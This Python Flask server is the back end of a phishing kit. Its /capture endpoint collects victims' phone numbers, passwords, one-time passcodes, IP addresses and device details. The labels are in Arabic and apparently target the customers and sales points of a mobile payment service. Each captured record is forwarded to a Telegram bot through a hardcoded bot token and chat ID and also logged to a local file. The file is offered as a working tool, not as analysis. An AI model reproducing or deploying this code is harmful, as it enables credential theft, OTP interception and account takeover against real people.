from flask import Flask, request, jsonify
import requests
import json
from datetime import datetime

BOT_TOKEN = "8933088140:AAGGoZK5U4sGgLtZDoHru0Mv_rlkZVAGlyg"
CHAT_ID   = "6558060776"

app = Flask(__name__)

def send_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        r = requests.post(url, json=payload, timeout=10)
        return r.ok
    except Exception as e:
        print(f"[!] Telegram error: {e}")
        return False

def format_login(data):
    phone = data.get("phone", "—")
    password = data.get("password", "—")
    role = data.get("role", "—")
    ip = data.get("ip", "—")
    ua = data.get("user_agent", "—")
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    role_ar = "عميل" if role == "client" else "نقطة مبيعات"
    return (
        "🎯 <b>تسجيل دخول جديد</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 <b>النوع:</b> {role_ar}\n"
        f"📱 <b>رقم الموبايل:</b> <code>{phone}</code>\n"
        f"🔑 <b>كلمة المرور:</b> <code>{password}</code>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 <b>IP:</b> <code>{ip}</code>\n"
        f"💻 <b>الجهاز:</b> <code>{ua[:100]}</code>\n"
        f"🕒 <b>الوقت:</b> {ts}\n"
        "━━━━━━━━━━━━━━━━━━━━━"
    )

def format_otp(data):
    phone = data.get("phone", "—")
    password = data.get("password", "—")
    otp = data.get("otp", "—")
    ip = data.get("ip", "—")
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    return (
        "🔐 <b>رمز التحقق (OTP)</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"📱 <b>رقم الموبايل:</b> <code>{phone}</code>\n"
        f"🔑 <b>كلمة المرور:</b> <code>{password}</code>\n"
        f"🔢 <b>الرمز:</b> <code>{otp}</code>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 <b>IP:</b> <code>{ip}</code>\n"
        f"🕒 <b>الوقت:</b> {ts}\n"
        "━━━━━━━━━━━━━━━━━━━━━"
    )

def format_resend(data):
    phone = data.get("phone", "—")
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    return (
        "🔁 <b>طلب إعادة إرسال الرمز</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"📱 <b>رقم الموبايل:</b> <code>{phone}</code>\n"
        f"🕒 <b>الوقت:</b> {ts}\n"
        "━━━━━━━━━━━━━━━━━━━━━"
    )

@app.route("/")
def index():
    return "Server Running ✓"

@app.route("/health")
def health():
    return jsonify({"status": "alive", "time": datetime.now().isoformat()})

@app.route("/capture", methods=["POST", "OPTIONS"])
def capture():
    if request.method == "OPTIONS":
        resp = jsonify({"status": "ok"})
        resp.headers["Access-Control-Allow-Origin"] = "*"
        resp.headers["Access-Control-Allow-Headers"] = "Content-Type"
        resp.headers["Access-Control-Allow-Methods"] = "POST, OPTIONS"
        return resp

    try:
        data = request.get_json(force=True, silent=True) or {}
        data["ip"] = request.headers.get("X-Forwarded-For", request.remote_addr)
        data["user_agent"] = request.headers.get("User-Agent", "")
    except Exception as e:
        print(f"[!] Parse error: {e}")
        data = {}

    print("\n" + "=" * 40)
    print("🎯 CAPTURED:")
    print(json.dumps(data, ensure_ascii=False, indent=2))
    print("=" * 40 + "\n")

    msg_type = data.get("type", "login")
    if msg_type == "otp":
        send_telegram(format_otp(data))
    elif msg_type == "resend":
        send_telegram(format_resend(data))
    else:
        send_telegram(format_login(data))

    try:
        with open("captured.txt", "a", encoding="utf-8") as f:
            f.write(f"{msg_type}|{data.get('phone')}|{data.get('password')}|{data.get('otp','')}|{data.get('ip')}\n")
    except:
        pass

    resp = jsonify({"status": "received"})
    resp.headers["Access-Control-Allow-Origin"] = "*"
    return resp

if __name__ == "__main__":
    print("=" * 40)
    print("  🩸 Server Running on port 5000")
    print("=" * 40)
    app.run(host="0.0.0.0", port=5000, debug=False)